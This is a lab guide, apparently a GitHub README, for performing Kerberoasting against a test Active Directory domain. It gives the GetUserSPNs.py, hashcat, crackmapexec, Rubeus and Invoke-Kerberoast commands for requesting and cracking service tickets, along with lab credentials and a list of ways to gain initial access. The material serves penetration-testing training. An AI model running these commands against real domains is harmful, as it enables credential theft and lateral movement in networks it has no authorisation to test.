# Kerberoasting Lab Guide

## Overview

Kerberoasting is a post-exploitation attack that targets service accounts in Active Directory. It exploits the Kerberos authentication protocol by requesting service tickets (TGS) that are encrypted with the service account's password hash, then cracking them offline.

## Prerequisites & Context

### Post-Exploitation

Kerberoasting is a **post-exploitation** technique, meaning you need initial access to the domain before performing this attack. You must have:

- Valid domain user credentials
- Network access to the Domain Controller
- Impacket tools installed on attacker machine

### Obtaining Credentials

In a penetration test, initial domain credentials could be obtained through:

- **LLMNR/NBT-NS Poisoning** - Capture authentication attempts on the network
- **Password Spraying** - Test common passwords against user accounts
- **Phishing** - Social engineering to obtain credentials
- **Physical Access** - Dumping credentials from unlocked workstations
- **Default Credentials** - Service accounts with weak/default passwords
- **Credential Stuffing** - Using breached credentials from other sources

**For this lab**, we're using a standard domain user account (`jdoe:Welcome123!`) created during setup to simulate having already gained initial access.

### Why This Matters

The power of kerberoasting is that ANY authenticated domain user can request service tickets. You don't need elevated privileges or admin access - just a valid domain account. This makes it a common lateral movement technique after initial compromise.

## Prerequisites

- Domain user credentials
- Network access to the Domain Controller
- Impacket tools installed on attacker machine


## Attack Steps

### 1. Enumerate Service Accounts

From the Attack Box, use GetUserSPNs.py to find accounts with Service Principal Names (SPNs):
```bash
GetUserSPNs.py lab.local/jdoe:Welcome123! -dc-ip 10.0.1.10
```

This will list all service accounts with SPNs in the domain.
###
<img width="1242" height="207" alt="image" src="https://github.com/user-attachments/assets/2b6895f3-c75f-43f7-8b75-d1cae0619580" />


### 2. Request Service Tickets

Request TGS tickets for the service accounts:
```bash
GetUserSPNs.py lab.local/jdoe:Welcome123! -dc-ip 10.0.1.10 -request -outputfile tickets.txt
```

This saves the tickets to `tickets.txt` in a format ready for cracking.

<img width="1331" height="206" alt="image" src="https://github.com/user-attachments/assets/07aea4c8-bbf8-461e-b587-30bd6a1ab886" />


### 3. Crack the Tickets

Use Hashcat to crack the tickets offline:
```bash
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt --force
```

- `-m 13100`: Kerberos TGS-REP mode
- `--force`: Ignore warnings (for VM environments)

  <img width="1897" height="859" alt="image" src="https://github.com/user-attachments/assets/8d2d8000-9bed-4d2e-816b-61752fd3958a" />


### 4. Review Results

Check cracked passwords:
```bash
hashcat -m 13100 tickets.txt --show
```
<img width="1892" height="350" alt="image" src="https://github.com/user-attachments/assets/190a149a-006d-4219-a01c-bbe2d7df3256" />

### 5. Verify Access

Test the cracked credentials:
```bash
crackmapexec smb 10.0.1.10 -u svc_sql -p Password1 -d lab.local
```

## Expected Results

- `svc_sql` (Password1) - Should crack quickly
- `svc_web` (Summer2024!) - May take longer
- `svc_backup` - Will not crack with rockyou.txt

  <img width="1750" height="286" alt="image" src="https://github.com/user-attachments/assets/9018c5ad-29ac-408f-9d82-110aa4a27399" />


## Alternative Tools

### Using Rubeus (Windows)

If attacking from a Windows machine on the domain:
```powershell
.\Rubeus.exe kerberoast /outfile:tickets.kirbi
```

### Using Invoke-Kerberoast (PowerShell)
```powershell
Invoke-Kerberoast -OutputFormat Hashcat | Out-File -FilePath tickets.txt
```

## Notes

- Any authenticated domain user can request service tickets
- Cracking happens offline, making detection difficult
- Strong passwords (25+ characters) make this attack impractical
